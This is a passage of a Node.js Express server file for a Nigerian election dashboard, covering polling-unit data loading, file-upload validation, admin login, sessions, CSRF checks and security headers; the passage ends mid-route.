const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const { rateLimit } = require('express-rate-limit');
const crypto = require('crypto');
const fs = require('fs/promises');
const path = require('path');
const Papa = require('papaparse');
require('dotenv').config();

function disableProxyForGoogleAuth() {
  for (const key of ['HTTP_PROXY', 'HTTPS_PROXY', 'ALL_PROXY', 'http_proxy', 'https_proxy', 'all_proxy']) {
    delete process.env[key];
  }
}

disableProxyForGoogleAuth();

const { getFileMetadata, listFilesInFolderTree, searchFiles, readFile, readPopulationData } = require('./drive');
const adminAuth = require('./src/admin-auth');
const { buildPollingUnitDashboardData, normalizeLookupKey } = require('./polling-data');
const { runIngest, loadLatestSnapshot, getIngestStatus, hydrateIngestStatus } = require('./inec-ingest');
const { computeNigeriaKpis } = require('./nigeria-kpis');
const { loadChoropleth, listAvailableDatasets, listAvailableGovStates, listGovCatalog, PARTY_COLORS } = require('./election-results-data');
const {
  buildDataCatalog,
  publicCatalogForClient,
  findCatalogEntry,
  buildDownload,
} = require('./src/data-catalog');
const { buildAnalysisBundle, sliceAnalysisPayload } = require('./election-analysis');
const {
  ensurePollingUnitsSeeded,
  ensureElectionResultsSeeded,
  importPollingUnitsFromCsv,
  queryPollingUnits,
  getPollingDirectoryTree,
  quarantineLegacyElectionResults,
  getDbStatus,
  insertLiveSubmission,
  getLiveSubmissionById,
  listLiveSubmissions,
  updateLiveSubmissionStatus,
  CSV_PATH,
} = require('./db');
const {
  importUploadFiles,
  listBoundaryLayers,
  queryBoundariesGeoJson,
  deleteBoundaryLayer,
  importGeoJson,
  BOUNDARIES_DIR,
} = require('./boundaries-data');
const multer = require('multer');
const editorialStore = require('./src/editorial-store');
const { getSessionSecret: getConfiguredSessionSecret } = require('./src/config');
const { storeSource } = require('./src/storage');
const mapConfigsStore = require('./src/map-configs-store');
const dashboardLayouts = require('./src/dashboard-layouts');
const pageContentStore = require('./src/page-content-store');

const boundaryUpload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 25 * 1024 * 1024, files: 8, parts: 12 },
  fileFilter: (_req, file, callback) => {
    const allowed = /\.(zip|geojson|json|shp|dbf|shx|prj|cpg)$/i.test(file.originalname || '');
    callback(allowed ? null : new Error('Unsupported boundary file type.'), allowed);
  },
});
const sourceUpload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 40 * 1024 * 1024, files: 1, parts: 6 },
  fileFilter: (_req, file, callback) => {
    const allowed = /\.(pdf|csv|json)$/i.test(file.originalname || '');
    callback(allowed ? null : new Error('Source evidence must be PDF, CSV, or JSON.'), allowed);
  },
});

const LIVE_SUBMISSIONS_DIR = process.env.LIVE_SUBMISSIONS_DIR
  ? path.resolve(process.env.LIVE_SUBMISSIONS_DIR)
  : path.join(__dirname, 'data', 'live-submissions');

const liveSubmissionUpload = multer({
  storage: multer.diskStorage({
    destination: (_req, _file, cb) => {
      fs.mkdir(LIVE_SUBMISSIONS_DIR, { recursive: true })
        .then(() => cb(null, LIVE_SUBMISSIONS_DIR))
        .catch((err) => cb(err));
    },
    filename: (_req, file, cb) => {
      const safe = String(file.originalname || 'sheet.jpg')
        .replace(/[^a-zA-Z0-9._-]+/g, '_')
        .slice(0, 80);
      cb(null, `${Date.now()}-${crypto.randomBytes(6).toString('hex')}-${safe}`);
    },
  }),
  limits: { fileSize: 12 * 1024 * 1024, files: 1, parts: 20 },
  fileFilter: (_req, file, callback) => {
    const allowed = /^image\//i.test(file.mimetype || '') || /\.(jpe?g|png|webp|gif|heic)$/i.test(file.originalname || '');
    callback(allowed ? null : new Error('Result sheet must be an image.'), allowed);
  },
});

function hasExpectedMagic(file, boundary = false) {
  const name = String(file?.originalname || '').toLowerCase();
  const buffer = file?.buffer;
  if (!Buffer.isBuffer(buffer) || !buffer.length) return false;
  if (/\.pdf$/.test(name)) return buffer.subarray(0, 5).toString('ascii') === '%PDF-';
  if (/\.zip$/.test(name)) return buffer[0] === 0x50 && buffer[1] === 0x4b;
  if (/\.(geojson|json)$/.test(name)) return /^[\s\uFEFF]*[\[{]/.test(buffer.subarray(0, 1024).toString('utf8'));
  if (/\.(shp|shx)$/.test(name)) return buffer.length >= 4 && buffer.readInt32BE(0) === 9994;
  if (/\.dbf$/.test(name)) return [0x02, 0x03, 0x30, 0x31, 0x32, 0x43, 0x63, 0x83, 0x8b, 0xf5].includes(buffer[0]);
  if (/\.(csv|prj|cpg)$/.test(name)) return !buffer.subarray(0, 4096).includes(0) && (!boundary || buffer.length < 5 * 1024 * 1024);
  return false;
}

const app = express();
const PORT = process.env.PORT || 3000;
const HOST = process.env.HOST || '127.0.0.1';
const LOCAL_BASE_URL = `http://localhost:${PORT}`;
const LOCAL_POPULATION_DATA_PATH = path.join(__dirname, 'data', 'reference', 'population-pvc-data.json');
const LOCAL_POLLING_UNIT_DATA_PATH = path.join(__dirname, 'data', 'reference', 'Nigeria_polling_units.csv');
const ADMIN_SETTINGS_PATH = path.join(__dirname, 'admin-settings.json');
const ADMIN_ACCESS_PATH = path.join(__dirname, 'admin-access.json');
const GOOGLE_CREDENTIALS_PATH = path.join(__dirname, 'credentials.json');
const GOOGLE_TOKEN_PATH = path.join(__dirname, 'token.json');
const ADMIN_COOKIE_NAME = 'election_admin_session';
const PRIMARY_ADMIN_EMAIL = String(process.env.PRIMARY_ADMIN_EMAIL || '').trim().toLowerCase();
const SESSION_TTL_MS = 12 * 60 * 60 * 1000;
const loginRateLimit = rateLimit({
  windowMs: 15 * 60 * 1000,
  limit: 10,
  standardHeaders: 'draft-8',
  legacyHeaders: false,
  message: { error: 'Too many login attempts. Try again later.' },
});
const DEV_SESSION_SECRET = crypto.randomBytes(48).toString('base64url');
const DRIVE_DASHBOARD_FOLDER_NAME = 'Election Dashboard';
const POLLING_UNIT_POINTS_SOURCE_URL =
  'https://github.com/mykeels/inec-polling-units/raw/refs/heads/master/polling-units.csv';
const NIGERIA_BOUNDS = {
  south: 4.0,
  north: 14.9,
  west: 2.5,
  east: 15.8,
};
const SUPPORTED_FILE_TYPES = [
  {
    type: 'data',
    label: 'JSON',
    mimeTypes: ['application/json'],
    extensions: ['.json'],
  },
  {
    type: 'table',
    label: 'CSV',
    mimeTypes: ['text/csv', 'text/plain'],
    extensions: ['.csv'],
  },
  {
    type: 'kml',
    label: 'KML',
    mimeTypes: ['application/vnd.google-earth.kml+xml'],
    extensions: ['.kml'],
  },
  {
    type: 'kml',
    label: 'KMZ',
    mimeTypes: ['application/vnd.google-earth.kmz'],
    extensions: ['.kmz'],
  },
  {
    type: 'image',
    label: 'JPEG',
    mimeTypes: ['image/jpeg'],
    extensions: ['.jpg', '.jpeg'],
  },
  {
    type: 'image',
    label: 'TIFF',
    mimeTypes: ['image/tiff'],
    extensions: ['.tif', '.tiff'],
  },
];

const configuredOrigins = String(process.env.CORS_ORIGINS || process.env.BASE_URL || LOCAL_BASE_URL)
  .split(',').map((value) => value.trim()).filter(Boolean);
if (process.env.NODE_ENV !== 'production') {
  configuredOrigins.push(`http://127.0.0.1:${PORT}`, `http://localhost:${PORT}`);
}
const allowedOrigins = new Set(configuredOrigins);

app.disable('x-powered-by');
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      // EID UI loads React + Babel from unpkg; Babel standalone needs unsafe-eval.
      scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'", 'https://unpkg.com'],
      styleSrc: ["'self'", "'unsafe-inline'", 'https://fonts.googleapis.com'],
      fontSrc: ["'self'", 'https://fonts.gstatic.com', 'data:'],
      connectSrc: ["'self'", 'https://unpkg.com', 'https://*.inecnigeria.org', 'https://*.inecelectionresults.ng', 'https://*.arcgis.com', 'https://*.googleapis.com', 'https://newsapi.org', 'https://api.gdeltproject.org', 'https://feeds.bbci.co.uk', 'https://*.bbci.co.uk', 'https://mt0.google.com', 'https://mt1.google.com', 'https://mt2.google.com', 'https://mt3.google.com'],
      imgSrc: ["'self'", 'data:', 'blob:', 'https:', 'https://flagcdn.com', 'https://*.google.com', 'https://*.googleapis.com', 'https://*.gstatic.com'],
      workerSrc: ["'self'", 'blob:'],
      upgradeInsecureRequests: process.env.COOKIE_SECURE === 'true' ? [] : null,
    },
  },
  strictTransportSecurity: process.env.COOKIE_SECURE === 'true' ? undefined : false,
  crossOriginEmbedderPolicy: false,
}));
app.use(cors({
  credentials: true,
  origin(origin, callback) {
    if (!origin || allowedOrigins.has(origin)) return callback(null, true);
    return callback(new Error('Cross-origin request denied.'));
  },
}));
app.use(express.json({ limit: '5mb' }));
app.use('/auth', rateLimit({ windowMs: 15 * 60 * 1000, limit: 30, standardHeaders: 'draft-8', legacyHeaders: false }));
app.use('/api/admin', rateLimit({ windowMs: 15 * 60 * 1000, limit: 240, standardHeaders: 'draft-8', legacyHeaders: false }));
app.use('/api/v1/admin', rateLimit({ windowMs: 15 * 60 * 1000, limit: 240, standardHeaders: 'draft-8', legacyHeaders: false }));

const runtimeState = { ready: false, error: null, initializedAt: null };

app.get('/health/live', (_req, res) => res.json({ ok: true }));
app.get('/health/ready', async (_req, res) => {
  const editorial = await editorialStore.readiness();
  const ready = runtimeState.ready && (process.env.NODE_ENV !== 'production' || editorial.ready);
  return res.status(ready ? 200 : 503).json({ ok: ready, initializedAt: runtimeState.initializedAt, editorial, error: runtimeState.error });
});

app.use(['/api/election-results', '/api/elections'], (_req, res, next) => {
  res.setHeader('Deprecation', 'true');
  res.setHeader('Sunset', 'Thu, 31 Dec 2026 23:59:59 GMT');
  res.setHeader('Link', '</api/v1/contests>; rel="successor-version"');
  next();
});

function validUuid(value) {
  return /^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(String(value || ''));
}

function editorialRequired(_req, res, next) {
  if (!editorialStore.isEnabled()) return res.status(503).json({ error: 'Editorial database is not configured.' });
  return next();
}

function editorialError(res, error) {
  const message = error.message || 'Editorial operation failed.';
  const clientError = /required|invalid|unknown|duplicate|cannot|only|evidence|dataset/i.test(message);
  return res.status(clientError ? 400 : 500).json({ error: message });
}

async function readJsonFile(filePath, fallback) {
  try {
    const contents = await fs.readFile(filePath, 'utf8');
    return JSON.parse(contents);
  } catch (error) {
    if (error.code === 'ENOENT') {
      return fallback;
    }

    throw error;
  }
}

async function writeJsonFile(filePath, data) {
  await fs.writeFile(filePath, JSON.stringify(data, null, 2));
}

function toDisplayCase(value) {
  return String(value || '')
    .trim()
    .toLowerCase()
    .replace(/\s+/g, ' ')
    .replace(/(^|[\s/-])([a-z])/g, (match, prefix, letter) => `${prefix}${letter.toUpperCase()}`);
}

function parseNumericValue(value) {
  const normalized = String(value ?? '').replace(/,/g, '').trim();
  if (!normalized) return null;
  const number = Number(normalized);
  return Number.isFinite(number) ? number : null;
}

function parseCoordinatePair(value) {
  const text = String(value || '').trim();

  if (!text) {
    return null;
  }

  const wktMatch = text.match(/point\s*\(\s*(-?\d+(?:\.\d+)?)\s+(-?\d+(?:\.\d+)?)\s*\)/i);

  if (wktMatch) {
    return {
      longitude: Number(wktMatch[1]),
      latitude: Number(wktMatch[2]),
    };
  }

  const decimalMatch = text.match(/(-?\d+(?:\.\d+)?)\s*,\s*(-?\d+(?:\.\d+)?)/);

  if (decimalMatch) {
    return {
      latitude: Number(decimalMatch[1]),
      longitude: Number(decimalMatch[2]),
    };
  }

  return null;
}

function isWithinNigeriaBounds(latitude, longitude) {
  return (
    Number.isFinite(latitude) &&
    Number.isFinite(longitude) &&
    latitude >= NIGERIA_BOUNDS.south &&
    latitude <= NIGERIA_BOUNDS.north &&
    longitude >= NIGERIA_BOUNDS.west &&
    longitude <= NIGERIA_BOUNDS.east
  );
}

function buildPollingUnitAddressQuery(row) {
  return [row.name, row.ward, row.lga, row.state, 'Nigeria']
    .map((part) => String(part || '').trim())
    .filter(Boolean)
    .join(', ');
}

function getFieldValue(row, candidates = []) {
  if (!row) return null;
  const entries = Object.entries(row).map(([key, value]) => [normalizeLookupKey(key), value]);
  for (const candidate of candidates) {
    const want = normalizeLookupKey(candidate);
    const hit = entries.find(([key]) => key === want);
    if (hit && hit[1] != null && String(hit[1]).trim() !== '') return hit[1];
  }
  return null;
}

function normalizePollingUnitPointRow(row) {
  const state = toDisplayCase(
    getFieldValue(row, ['state', 'state_name', 'stateName', 'lga_state', 'location_state']) ||
      row.State ||
      row.STATE
  );
  const lga = toDisplayCase(
    getFieldValue(row, ['lga', 'lg', 'lga_name', 'lgaName', 'local_government_area', 'localgovernmentarea']) ||
      getFieldValue(row, ['local_government_name']) ||
      row.LGA ||
      row.lga_name
  );
  const ward = toDisplayCase(
    getFieldValue(row, ['ward', 'ward_name', 'wardName']) || row.WARD || row.ward_name
  );
  const pollingUnit = toDisplayCase(
    getFieldValue(row, [
      'polling_unit',
      'pollingunit',
      'polling_unit_name',
      'pollingunitname',
      'pu_name',
      'location',
      'name',
    ]) ||
      row.polling_unit_name ||
      row.name
  );
  const sourceName = String(getFieldValue(row, ['location', 'name']) || row.location || row.name || '').trim();
  const address = String(getFieldValue(row, ['location']) || row.location || '').trim();

  const latitudeCandidates = [
    'lat',
    'latitude',
    'location.latitude',
    'gps_latitude',
    'gpslat',
    'y',
    'northing',
  ];
  const longitudeCandidates = [
    'long',
    'longitude',
    'location.longitude',
    'lng',
    'lon',
    'long',
    'gps_longitude',
    'gpslng',
    'x',
    'easting',
  ];

  let latitude = parseNumericValue(getFieldValue(row, latitudeCandidates));
  let longitude = parseNumericValue(getFieldValue(row, longitudeCandidates));
  const sourceHasCoordinates = Number.isFinite(latitude) && Number.isFinite(longitude);

  if (!Number.isFinite(latitude) || !Number.isFinite(longitude)) {
    // `location` is an address/name field in the canonical INEC CSV. Parsing its
    // street and polling-unit numbers as a coordinate pair creates false points.
    const coordinateText = getFieldValue(row, ['coordinates', 'coordinate', 'geo', 'point']);
    const parsedPair = parseCoordinatePair(coordinateText);

    if (parsedPair) {
      latitude = parsedPair.latitude;
      longitude = parsedPair.longitude;
    }
  }

  return {
    state,
    lga,
    ward,
    pollingUnit,
    latitude,
    longitude,
    sourceHasCoordinates,
    code: String(
      // Prefer full delimitation code (e.g. 37/06/02/061) over short pu_code (061).
      getFieldValue(row, ['code', 'polling_unit_code', 'pollingunitcode', 'pu_code']) || ''
    ).trim(),
    name: sourceName,
    address,
    addressQuery: buildPollingUnitAddressQuery({ name: sourceName, ward, lga, state }),
  };
}

function parseBBox(value) {
  if (!value) {
    return null;
  }

  const parts = String(value)
    .split(',')
    .map((part) => Number(part.trim()));

  if (parts.length !== 4 || parts.some((part) => !Number.isFinite(part))) {
    return null;
  }

  const [west, south, east, north] = parts;
  return { west, south, east, north };
}

function isPointInsideBBox(point, bbox) {
  if (!bbox) {
    return true;
  }

  return (
    point.longitude >= bbox.west &&
    point.longitude <= bbox.east &&
    point.latitude >= bbox.south &&
    point.latitude <= bbox.north
  );
}

let pollingUnitPointsCache = null;
let localPollingPointsCache = null;
let pollingTreeCache = null;
let pollingTreePromise = null;

async function loadLocalPollingUnitCoordinateOverrides() {
  try {
    const csvText = await fs.readFile(LOCAL_POLLING_UNIT_DATA_PATH, 'utf8');
    const parsed = Papa.parse(csvText, {
      header: true,
      skipEmptyLines: true,
      transformHeader: (header) => String(header || '').trim(),
    });

    if (parsed.errors?.length) {
      console.warn('Local polling CSV parsed with warnings:', parsed.errors[0]);
    }

    const overrides = new Map();

    for (const row of parsed.data || []) {
      const code = String(getFieldValue(row, ['code']) || '').trim();
      const latitude = parseNumericValue(getFieldValue(row, ['lat', 'latitude', 'location.latitude']));
      const longitude = parseNumericValue(getFieldValue(row, ['long', 'longitude', 'location.longitude']));

      if (!code || !Number.isFinite(latitude) || !Number.isFinite(longitude)) {
        continue;
      }

      overrides.set(code, {
        latitude,
        longitude,
        geometrySource: 'csv-latlong',
      });
    }

    return overrides;
  } catch (error) {
    if (error.code === 'ENOENT') {
      return new Map();
    }

    throw error;
  }
}

async function loadLocalPollingUnitPoints() {
  if (localPollingPointsCache) return localPollingPointsCache;
  const csvText = await fs.readFile(LOCAL_POLLING_UNIT_DATA_PATH, 'utf8');
  const parsed = Papa.parse(csvText, {
    header: true,
    skipEmptyLines: true,
    transformHeader: (header) => String(header || '').trim(),
  });

  if (parsed.errors?.length) {
    console.warn('Local polling unit CSV parsed with warnings:', parsed.errors[0]);
  }

  localPollingPointsCache = (parsed.data || [])
    .map((row) => normalizePollingUnitPointRow(row))
    .filter((point) => point.state && point.lga && point.code);
  return localPollingPointsCache;
}

async function loadLocalPollingUnitPointsForArea({ state, lga } = {}) {
  const csvText = await fs.readFile(LOCAL_POLLING_UNIT_DATA_PATH, 'utf8');
  const [header, ...lines] = csvText.split(/\r?\n/);
  const stateKey = normalizeLookupKey(state);
  const lgaKey = normalizeLookupKey(lga);
  const matchingLines = lines.filter((line) => {
    const columns = line.split(',', 4);
    return normalizeLookupKey(columns[1]) === stateKey &&
      (!lgaKey || normalizeLookupKey(columns[2]) === lgaKey);
  });

  const parsed = Papa.parse([header, ...matchingLines].join('\n'), {
    header: true,
    skipEmptyLines: true,
    transformHeader: (column) => String(column || '').trim(),
  });

  return (parsed.data || [])
    .map((row) => normalizePollingUnitPointRow(row))
    .filter((point) => point.state && point.lga && point.code);
}

async function resolvePollingUnitCoordinates(points) {
  return points.map((point) => {
    const sourceLatitude = point.latitude;
    const sourceLongitude = point.longitude;
    const sourceIsValid = isWithinNigeriaBounds(sourceLatitude, sourceLongitude);
    return {
      ...point,
      sourceLatitude,
      sourceLongitude,
      latitude: sourceIsValid ? sourceLatitude : null,
      longitude: sourceIsValid ? sourceLongitude : null,
      geometrySource: sourceIsValid ? (point.geometrySource || 'source-provided') : 'unavailable',
      sourceCoordinatesAvailable: sourceIsValid,
      coordinateStatus: sourceIsValid ? 'source-provided' : 'unavailable',
    };
  });
}

async function loadPollingUnitPoints() {
  if (pollingUnitPointsCache) {
    return pollingUnitPointsCache;
  }

  let points;
  try {
    const response = await fetch(POLLING_UNIT_POINTS_SOURCE_URL, {
      headers: { accept: 'text/csv' },
      signal: AbortSignal.timeout(12000),
    });

    if (!response.ok) {
      throw new Error(`Failed to load polling unit points: ${response.status}`);
    }

    const csvText = await response.text();
    const parsed = Papa.parse(csvText, {
      header: true,
      skipEmptyLines: true,
      transformHeader: (header) => String(header || '').trim(),
    });

    if (parsed.errors?.length) {
      console.warn('Polling unit points CSV parsed with warnings:', parsed.errors[0]);
    }

    points = (parsed.data || []).map((row) => normalizePollingUnitPointRow(row)).filter(Boolean);
  } catch (error) {
    console.warn('Remote polling point source unavailable; using local polling-unit CSV:', error.message || error);
    points = await loadLocalPollingUnitPoints();
  }

  const localOverrides = await loadLocalPollingUnitCoordinateOverrides();
  const mergedPoints = points.map((point) => {
    const override = localOverrides.get(point.code);

    if (!override) {
      return point;
    }

    return {
      ...point,
      ...override,
      overrideCoordinates: true,
    };
  });

  const resolvedPoints = await resolvePollingUnitCoordinates(mergedPoints);

  pollingUnitPointsCache = resolvedPoints;
  return resolvedPoints;
}

// Load and resolve only the selected area for interactive map requests. This
// avoids sending the entire national register before the user chooses a state.
async function loadPollingUnitPointsForArea({ state, lga } = {}) {
  const areaPoints = await loadLocalPollingUnitPointsForArea({ state, lga });
  return resolvePollingUnitCoordinates(areaPoints);
}

function pickNormalizedKey(obj, name) {
  if (!obj || !name) return null;
  if (Object.prototype.hasOwnProperty.call(obj, name)) return name;
  const key = normalizeLookupKey(name);
  return Object.keys(obj).find((item) => normalizeLookupKey(item) === key) || null;
}

async function getPollingTree() {
  if (pollingTreeCache) return pollingTreeCache;
  if (!pollingTreePromise) {
    pollingTreePromise = (async () => {
      ensurePollingUnitsSeeded(normalizePollingUnitPointRow);
      pollingTreeCache = getPollingDirectoryTree();
      return pollingTreeCache;
    })();
  }
  return pollingTreePromise;
}

async function loadPollingUnitPointsFromDb(filters = {}) {
  ensurePollingUnitsSeeded(normalizePollingUnitPointRow);
  return queryPollingUnits(filters);
}

function buildPollingUnitPointResponse(points, { state, lga, ward, q, bbox, limit } = {}) {
  const stateKey = normalizeLookupKey(state);
  const lgaKey = normalizeLookupKey(lga);
  const wardKey = normalizeLookupKey(ward);
  const queryKey = normalizeLookupKey(q);
  const max = Number(limit) > 0 ? Number(limit) : 0;
  const filteredPoints = [];

  for (const point of points) {
    if (stateKey && normalizeLookupKey(point.state) !== stateKey) continue;
    if (lgaKey && normalizeLookupKey(point.lga) !== lgaKey) continue;
    if (wardKey && normalizeLookupKey(point.ward) !== wardKey) continue;
    if (!isPointInsideBBox(point, bbox)) continue;
    if (queryKey) {
      const hay = normalizeLookupKey(
        [point.pollingUnit, point.name, point.ward, point.lga, point.state, point.code].join(' ')
      );
      if (!hay.includes(queryKey)) continue;
    }
    filteredPoints.push({
      ...point,
      state: point.state || '',
      lga: point.lga || '',
      ward: point.ward || '',
      pollingUnit: point.pollingUnit || '',
      address: point.address || point.name || '',
    });
    if (max && filteredPoints.length >= max) break;
  }

  return filteredPoints;
}

async function isServerDriveConfigured() {
  try {
    await fs.access(GOOGLE_CREDENTIALS_PATH);
    await fs.access(GOOGLE_TOKEN_PATH);
    return true;
  } catch {
    return false;
  }
}

function parseCookies(req) {
  const header = req.headers.cookie || '';
  return Object.fromEntries(
    header
      .split(';')
      .map((entry) => entry.trim())
      .filter(Boolean)
      .map((entry) => {
        const separatorIndex = entry.indexOf('=');
        const name = separatorIndex >= 0 ? entry.slice(0, separatorIndex) : entry;
        const value = separatorIndex >= 0 ? entry.slice(separatorIndex + 1) : '';
        return [name, decodeURIComponent(value)];
      })
  );
}

function getSessionSecret() {
  const configured = getConfiguredSessionSecret();
  if (configured) return configured;
  if (process.env.NODE_ENV === 'production') {
    throw new Error('ADMIN_SESSION_SECRET is required in production.');
  }
  return DEV_SESSION_SECRET;
}

function timingSafeTextEqual(left, right) {
  const a = Buffer.from(String(left || ''));
  const b = Buffer.from(String(right || ''));
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}

async function readSession(req) {
  const token = parseCookies(req)[ADMIN_COOKIE_NAME];
  return editorialStore.getAdminSession(token);
}

function setCookie(res, name, value, maxAgeMs) {
  const maxAge = Math.floor(maxAgeMs / 1000);
  const secure = process.env.COOKIE_SECURE === 'true' ? '; Secure' : '';
  appendCookie(
    res,
    `${name}=${encodeURIComponent(value)}; Path=/; HttpOnly; SameSite=Lax; Max-Age=${maxAge}${secure}`
  );
}

function clearCookie(res, name) {
  appendCookie(res, `${name}=; Path=/; HttpOnly; SameSite=Lax; Max-Age=0`);
}

function appendCookie(res, cookie) {
  const existing = res.getHeader('Set-Cookie');

  if (!existing) {
    res.setHeader('Set-Cookie', cookie);
    return;
  }

  res.setHeader('Set-Cookie', Array.isArray(existing) ? [...existing, cookie] : [existing, cookie]);
}

async function getAdminAccess() {
  const access = await readJsonFile(ADMIN_ACCESS_PATH, { admins: [] });
  const admins = new Set(Array.isArray(access.admins) ? access.admins : []);

  return { admins: [...admins].map((email) => String(email).trim().toLowerCase()).filter(Boolean).sort() };
}

async function isAllowedAdmin(email) {
  return adminAuth.isEmailAllowListed(email);
}

async function requireAdminApi(req, res, next) {
  const session = await readSession(req);
  if (session && (await isAllowedAdmin(session.email))) {
    req.admin = session;
    return next();
  }
  return res.status(401).json({ error: 'Admin access required.' });
}

async function requireAdminWrite(req, res, next) {
  return requireAdminApi(req, res, () => {
    const supplied = req.get('x-csrf-token') || '';
    if (!supplied || !timingSafeTextEqual(supplied, req.admin.csrfToken)) {
      return res.status(403).json({ error: 'A valid CSRF token is required.' });
    }
    return next();
  });
}

async function requirePrimaryAdminApi(req, res, next) {
  await requireAdminApi(req, res, () => {
    if ((req.admin.email || '').toLowerCase() !== PRIMARY_ADMIN_EMAIL) {
      return res.status(403).json({ error: 'Only the primary admin can manage admin access.' });
    }

    return next();
  });
}

async function requirePrimaryAdminWrite(req, res, next) {
  return requireAdminWrite(req, res, () => {
    if ((req.admin.email || '').toLowerCase() !== PRIMARY_ADMIN_EMAIL) {
      return res.status(403).json({ error: 'Only the primary admin can manage admin access.' });
    }
    return next();
  });
}

async function requireAdminPage(req, res, next) {
  const session = await readSession(req);

  if (!session || !(await isAllowedAdmin(session.email))) {
    return res.redirect('/admin-login.html');
  }

  req.admin = session;
  return next();
}

function getBaseUrl(req) {
  return process.env.BASE_URL || LOCAL_BASE_URL;
}

async function readAdminSettings() {
  return readJsonFile(ADMIN_SETTINGS_PATH, {
    populationSource: {
      mode: 'local',
      fileId: '',
      mimeType: '',
      name: 'Local population-pvc-data.json',
      updatedAt: '',
      updatedBy: '',
    },
  });
}

async function getPopulationSource(req) {
  const settings = await readAdminSettings();
  const savedSource = settings.populationSource || {};

  return {
    fileId: process.env.POPULATION_DATA_FILE_ID || savedSource.fileId || '',
    mimeType: process.env.POPULATION_DATA_MIME_TYPE || savedSource.mimeType || '',
  };
}

function sanitizeDriveSearchTerm(value) {
  return String(value || '').replace(/\\/g, '\\\\').replace(/'/g, "\\'").trim();
}

async function getDashboardDriveFolder() {
  const folderName = sanitizeDriveSearchTerm(DRIVE_DASHBOARD_FOLDER_NAME);
  const folders = await searchFiles(
    `name = '${folderName}' and mimeType = 'application/vnd.google-apps.folder' and trashed = false`
  );

  return folders[0] || null;
}

function getSupportedPopulationFileQuery(extraCondition = '') {
  return [
    'trashed = false',
    extraCondition,
    "(" +
      [
        "mimeType = 'application/json'",
        "mimeType = 'text/csv'",
      ].join(' or ') +
      ")",
  ]
    .filter(Boolean)
    .join(' and ');
}

function isSupportedPopulationFile(file) {
  return [
    'application/json',
    'text/csv',
    'text/plain',
  ].includes(file.mimeType);
}

async function getDashboardDriveDataFiles() {
  const folder = await getDashboardDriveFolder();

  if (!folder) {
    return [];
  }

  const files = await listFilesInFolderTree(folder);
  return files.filter(isSupportedPopulationFile).sort((a, b) => a.path.localeCompare(b.path));
}

app.get('/auth/google', (_req, res) => {
  return res.redirect(302, '/admin-login.html');
});

app.get('/auth/google/callback', (_req, res) => {
  return res.status(410).send('Google admin sign-in has been removed. Use the local admin login at /admin-login.html.');
});

app.post('/auth/logout', requireAdminWrite, async (req, res) => {
  await editorialStore.deleteAdminSession(parseCookies(req)[ADMIN_COOKIE_NAME]);
  clearCookie(res, ADMIN_COOKIE_NAME);
  return res.json({ ok: true });
});

app.post('/api/admin/login', loginRateLimit, async (req, res) => {
  try {
    if (!(await adminAuth.isLocalAdminConfigured())) {
      return res.status(503).json({
        error: 'Admin login is not configured. Set ADMIN_USERNAME and ADMIN_PASSWORD (or ADMIN_PASSWORD_HASH), or create data/admin-credentials.json.',
      });
    }

    if (!editorialStore.isEnabled()) {
      return res.status(503).json({ error: 'Editorial database is not configured; admin sessions are unavailable.' });
    }

    const ready = await editorialStore.readiness();
    if (!ready.ready) {
      return res.status(503).json({ error: 'Admin sessions are not ready yet. Try again shortly.' });
    }

    const username = String(req.body?.username || req.body?.email || '').trim();
    const password = String(req.body?.password || '');

    if (!username || !password) {
      return res.status(400).json({ error: 'Username and password are required.' });
    }

    if (password.length > adminAuth.MAX_PASSWORD_LENGTH) {
      return res.status(400).json({ error: 'Invalid username or password.' });
    }

    const user = await adminAuth.authenticateLocalAdmin(username, password);
    if (!user) {
      return res.status(401).json({ error: 'Invalid username or password.' });
    }

    // Credential-file / env-bootstrap users are admins. Sync the allow-list so a
    // missing or stale admin-access.json (common in Docker images) cannot 403 a
    // valid password login.
    try {
      await adminAuth.ensureEmailOnAllowList(user.email);
    } catch (error) {
      console.warn('Unable to sync admin allow-list after login:', error.message || error);
    }

    if (!(await isAllowedAdmin(user.email))) {
      return res.status(403).json({ error: 'This account is not on the admin allow-list.' });
    }

    const session = await editorialStore.createAdminSession({
      email: user.email,
      name: user.name,
      picture: '',
    }, SESSION_TTL_MS);
    setCookie(res, ADMIN_COOKIE_NAME, session.token, SESSION_TTL_MS);
    return res.json({
      ok: true,
      email: user.email,
      name: user.name,
      csrfToken: session.csrfToken,
    });
  } catch (error) {
    console.error('Error handling /api/admin/login:', error.message || error);
    return res.status(500).json({ error: 'Unable to complete admin sign-in.' });
  }
});

app.get('/api/admin/verify', requireAdminApi, (req, res) => res.json({ success: true, admin: req.admin }));

app.get('/admin.html', requireAdminPage, (req, res) => {
  return res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.get('/api/admin/me', requireAdminApi, (req, res) => {
  return res.json({
    email: req.admin.email,
    name: req.admin.name,
    isPrimary: (req.admin.email || '').toLowerCase() === PRIMARY_ADMIN_EMAIL,
    csrfToken: req.admin.csrfToken,
  });
});

app.get('/api/admin/access', requirePrimaryAdminApi, async (req, res) => {
  const access = await getAdminAccess();
  return res.json(access);
});

app.post('/api/admin/access', requirePrimaryAdminWrite, async (req, res) => {
  const email = String(req.body.email || '').trim().toLowerCase();

  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    return res.status(400).json({ error: 'Enter a valid email address.' });
  }

  const access = await getAdminAccess();
  const admins = [...new Set([...access.admins, email])].sort();
  await writeJsonFile(ADMIN_ACCESS_PATH, { admins });
  return res.json({ admins });
});

app.delete('/api/admin/access/:email', requirePrimaryAdminWrite, async (req, res) => {
  const email = String(req.params.email || '').trim().toLowerCase();

  if (email === PRIMARY_ADMIN_EMAIL) {
    return res.status(400).json({ error: 'The primary admin cannot be removed.' });
  }

  const access = await getAdminAccess();
  const admins = access.admins.filter((adminEmail) => adminEmail !== email);
  await writeJsonFile(ADMIN_ACCESS_PATH, { admins });
  return res.json({ admins });
});

app.get('/api/admin/population-source', requireAdminApi, async (req, res) => {
  const settings = await readAdminSettings();
  return res.json(settings.populationSource);
});

app.post('/api/admin/population-source', requireAdminWrite, async (req, res) => {
